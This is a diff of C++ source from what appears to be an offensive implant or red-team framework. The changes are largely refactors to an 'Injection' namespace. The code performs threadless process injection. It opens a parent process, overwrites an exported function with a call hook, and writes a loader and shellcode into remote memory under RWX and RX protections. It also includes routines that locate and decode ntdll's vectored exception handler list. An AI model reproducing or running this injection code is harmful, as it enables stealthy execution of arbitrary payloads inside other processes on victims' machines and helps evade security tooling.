@@ -3,8 +3,7 @@
 #define EXPORT_OFFSET 0x12
 
 namespace Injection {
-
-    VOID Threadless(const _threadless &writer, void *shellcode, size_t n_shellcode, size_t total) {
+    VOID Threadless(const _threadless &writer, void *const shellcode, size_t n_shellcode, size_t total) {
         HEXANE
 
         HANDLE process      = { };
@@ -15,24 +14,24 @@ namespace Injection {
 
         if (!(ex_addr = Memory::Modules::LoadExportAddress(writer.module, writer.exp)) ||
             !(process = Process::OpenParentProcess(writer.parent)) ||
-            !(hook = Memory::Scanners::RelocateExport(process, R_CAST(LPVOID, ex_addr), n_shellcode))) {
+            !(hook = Memory::Scanners::RelocateExport(process, C_PTR(ex_addr), n_shellcode))) {
             return;
         }
 
-        auto loader_rva = hook - (ex_addr + 5);
         auto hook_p = hook;
+        const auto loader_rva = hook - (ex_addr + 5);
 
-        Memory::PatchMemory(B_PTR(&ex_addr_p), B_PTR(&ex_addr), 0, 0, sizeof(LPVOID));
-        Memory::PatchMemory(B_PTR(writer.loader), B_PTR(&ex_addr_p), EXPORT_OFFSET, 0, sizeof(LPVOID));
-        Memory::PatchMemory(B_PTR(writer.opcode), B_PTR(&loader_rva), CALL_X_OFFSET, 0, 4);
+        x_memcpy(&ex_addr_p, &ex_addr, sizeof(void*));
+        x_memcpy(B_PTR(writer.loader)+EXPORT_OFFSET, &ex_addr_p, sizeof(void*));
+        x_memcpy(B_PTR(writer.opcode)+CALL_X_OFFSET, &loader_rva, 4);
 
         if (
-            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(PVOID * , &ex_addr_p), &total, PAGE_EXECUTE_READWRITE, nullptr)) ||
-            !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(ex_addr), R_CAST(PVOID, writer.opcode->data), 0x5, &write)) || write != 0x5) {
+            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(void**, &ex_addr_p), &total, PAGE_EXECUTE_READWRITE, nullptr)) ||
+            !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(ex_addr), R_CAST(void*, writer.opcode->data), 0x5, &write)) || write != 0x5) {
             return_defer(ntstatus);
         }
         if (
-            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(LPVOID * , &hook_p), &total, PAGE_READWRITE, nullptr)) ||
+            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(void** , &hook_p), &total, PAGE_READWRITE, nullptr)) ||
             !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(hook), writer.loader->data, writer.loader->length, &write)) || write != writer.loader->length) {
             return_defer(ntstatus);
         }
@@ -41,7 +40,7 @@ namespace Injection {
 
         if (
             !NT_SUCCESS(ntstatus = Ctx->Nt.NtWriteVirtualMemory(process, C_PTR(hook + writer.loader->length), shellcode, n_shellcode, &write)) || write != n_shellcode ||
-            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(LPVOID * , &hook), &n_shellcode, PAGE_EXECUTE_READ, nullptr))) {
+            !NT_SUCCESS(ntstatus = Ctx->Nt.NtProtectVirtualMemory(process, R_CAST(void**, &hook), &n_shellcode, PAGE_EXECUTE_READ, nullptr))) {
             return_defer(ntstatus);
         }
 
@@ -53,7 +52,7 @@ namespace Injection {
 
     namespace Veh {
 
-        UINT_PTR GetFirstHandler(LDR_DATA_TABLE_ENTRY *module, const char *signature, const char *mask) {
+        UINT_PTR GetFirstHandler(LDR_DATA_TABLE_ENTRY *module, const char *const signature, const char *const mask) {
             HEXANE
 
             LdrpVectorHandlerList *handlers = { };
@@ -76,7 +75,7 @@ namespace Injection {
             return handler;
         }
 
-        UINT_PTR PointerEncoder(uintptr_t const &pointer, const bool encode) {
+        UINT_PTR PointerEncodeDecode(uintptr_t const &pointer, const bool encode) {
             HEXANE
 
             uintptr_t encoded = 0;
@@ -101,7 +100,7 @@ namespace Injection {
             const auto ntdll = Memory::Modules::GetModuleEntry(mod_hash);
 
             const auto entry = GetFirstHandler(ntdll, writer.signature, writer.mask);
-            const auto handler = PointerEncoder(entry, false) + 0x20;
+            const auto handler = PointerEncodeDecode(entry, false) + 0x20;
 
             if (!entry) {
                 return FALSE;
